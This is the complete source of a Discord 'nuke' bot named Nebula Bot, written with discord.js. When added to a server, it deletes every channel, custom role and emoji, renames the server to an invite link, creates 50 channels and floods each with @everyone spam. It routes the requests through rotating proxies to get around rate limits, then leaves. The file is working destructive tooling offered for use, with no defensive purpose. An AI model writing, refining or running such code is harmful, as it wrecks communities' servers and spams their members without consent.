const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
dotenv.config();

// ====== PROXY SETUP (Supports https-proxy-agent v5/v6 and SOCKS5) ======
let HttpProxyAgent;
try {
  const agentModule = require('https-proxy-agent');
  HttpProxyAgent = typeof agentModule === 'function'
    ? agentModule
    : agentModule.HttpProxyAgent || agentModule.default;
} catch (err) {
  console.warn('⚠️ Could not load https-proxy-agent:', err.message);
}

const { SocksProxyAgent } = require('socks-proxy-agent');

let proxies = [];
let currentProxyIndex = 0;

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf-8');
    proxies = data
      .split(/\r?\n|\r/)
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.length > 5);
    console.log(`✅ Loaded ${proxies.length} proxies.`);
  } catch (err) {
    console.warn('⚠️ Could not read proxies.txt:', err.message);
    proxies = [];
  }
}

function getProxyAgent() {
  if (proxies.length === 0) return null;
  const proxy = proxies[currentProxyIndex];
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

  if (proxy.startsWith('socks5://')) {
    return new SocksProxyAgent(proxy);
  } else {
    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
  }
}

// Reload proxies every 5 minutes
setInterval(loadProxies, 5 * 60 * 1000);
loadProxies(); // Load on startup

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== CUSTOM REST REQUEST WITH PROXY ======
const rest = client.rest;
const originalRequest = rest.request.bind(rest);

rest.request = async function(options) {
  const agent = getProxyAgent();
  if (agent) {
    options.agent = { https: agent };
  }
  return await originalRequest(options);
};

// ====== WEB SERVER (Keep Alive) ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on port ${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 3) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 500);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
        retries++;
      } else {
        console.error('❌ Request failed:', error.message);
        return null;
      }
    }
  }
  console.error('❌ Max retries exceeded.');
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  if (!guild || !guild.available) return;
  try {
    await handleRateLimit(() => guild.leave(), 2);
    console.log(`🚪 Left server: ${guild.name}`);
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log(`✅ Already left or kicked from ${guild.name}`);
    } else {
      console.error(`⚠️ Error leaving ${guild.name}:`, err.message);
    }
  }
}

// ====== ULTRA-FAST SPAM HELPER ======
async function sendWithProxy(channel, content, agent) {
  const options = {
    method: 'POST',
    path: `/channels/${channel.id}/messages`,
    data: { content }, // ✅ Fixed: now valid object syntax
    versioned: true,
  };

  if (agent) {
    options.agent = { https: agent };
  }

  try {
    await rest.request(options);
  } catch (error) {
    if (error.code === 429) {
      const retryAfter = error.retry_after || 1000;
      console.debug(`⏸️ Ratelimited on ${channel.id}: retrying after ${retryAfter}ms`);
      await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
    }
    // Ignore other errors (e.g. proxy timeout, invalid channel)
  }
}

// ====== BOT READY ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('Auto-nuking servers', { type: 'PLAYING' });
});

// ====== AUTO-NUKE ON JOIN (GUILD CREATE) ======
client.on('guildCreate', async (guild) => {
  console.log(`🚨 Joined new server: ${guild.name} (ID: ${guild.id}) - Auto-running .rip`);

  // 🔒 Protected server (your safe server)
  const BLOCKED_GUILD_ID = '1345474714331643956';
  if (guild.id === BLOCKED_GUILD_ID) {
    console.log('🔒 Protected server. Leaving...');
    await safeLeaveGuild(guild);
    return;
  }

  // Fetch bot member and check permissions
  const me = await guild.members.fetch(client.user.id).catch(() => null);
  if (!me) {
    console.log(`❌ Could not fetch self-member in ${guild.name}. Leaving...`);
    await safeLeaveGuild(guild);
    return;
  }

  const hasChannels = me.permissions.has('ManageChannels');
  const hasRoles = me.permissions.has('ManageRoles');
  if (!hasChannels || !hasRoles) {
    console.log(`❌ Missing permissions in ${guild.name}. Leaving...`);
    await safeLeaveGuild(guild);
    return;
  }

  try {
    const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
    const chName = 'neb-was-here';

    // === 1. Delete all channels ===
    await Promise.all(
      guild.channels.cache
        .filter(ch => ch.type !== 4) // Skip category channels
        .map(ch => handleRateLimit(() => ch.delete(), 2))
    );
    console.log(`🗑️ Deleted ${guild.channels.cache.size} channels`);

    // === 2. Delete all custom roles ===
    await Promise.all(
      guild.roles.cache
        .filter(r => r.name !== '@everyone' && !r.managed)
        .map(r => handleRateLimit(() => r.delete(), 2))
    );
    console.log('🛡️ Deleted custom roles');

    // === 3. Delete all emojis ===
    await Promise.all(
      guild.emojis.cache.map(e => handleRateLimit(() => e.delete(), 2))
    );
    console.log('🎨 Deleted emojis');

    // === 4. Rename server ===
    await handleRateLimit(() => guild.setName('discord.gg/migh'), 2);
    console.log('📛 Server renamed');

    // === 5. Create 50 new channels ===
    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(
        () => guild.channels.create({ name: `${chName}-${i + 1}` }),
        2
      );
      if (ch) channels.push(ch);
    }

    if (channels.length === 0) {
      console.log('❌ Failed to create any channels. Aborting spam...');
      await safeLeaveGuild(guild);
      return;
    }

    console.log(`🔥 Spamming ${channels.length} channels with 20 messages each...`);

    // === 6. SPAM: 20 messages per channel using 1 proxy per channel ===
    const spamStart = Date.now();
    const allSpamPromises = [];

    for (const channel of channels) {
      const proxyAgent = getProxyAgent(); // Rotate proxy per channel

      for (let i = 0; i < 20; i++) {
        allSpamPromises.push(
          sendWithProxy(channel, spamMsg, proxyAgent).catch(() => {})
        );
      }
    }

    await Promise.allSettled(allSpamPromises);
    const duration = Date.now() - spamStart;
    console.log(`💥 Spammed ~${allSpamPromises.length} messages in ${duration}ms!`);

    // === 7. Leave server ===
    await safeLeaveGuild(guild);
  } catch (err) {
    console.error('❌ Auto-rip failed:', err.message || err);
    await safeLeaveGuild(guild);
  }
});

// ====== MANUAL COMMANDS (Optional) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // Help command
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot')
      .setDescription('This bot auto-nukes servers on join.')
      .addFields(
        { name: '.help', value: 'Shows this message' },
        { name: '.servers', value: 'Lists all servers (owner only)' }
      )
      .setColor('#ff0000')
      .setTimestamp();

    try {
      await message.author.send({ embeds: [embed] });
      await message.reply('📬 Help sent to your DMs!');
    } catch {
      await message.reply('❌ Could not send DM. Enable your DMs.');
    }
  }

  // Server list (Owner only)
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') {
      await message.reply('❌ You are not the bot owner.');
      return;
    }

    const serverList = client.guilds.cache
      .map(g => `🔹 ${g.name} (\`${g.id}\`)`)
      .join('\n');

    await message.author.send(
      `🌐 **Nebula Bot is in ${client.guilds.cache.size} servers:**\n${serverList}`
    );
    await message.reply('📩 Server list sent to your DMs.');
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN).catch(err => {
  console.error('❌ Failed to log in:', err.message);
});
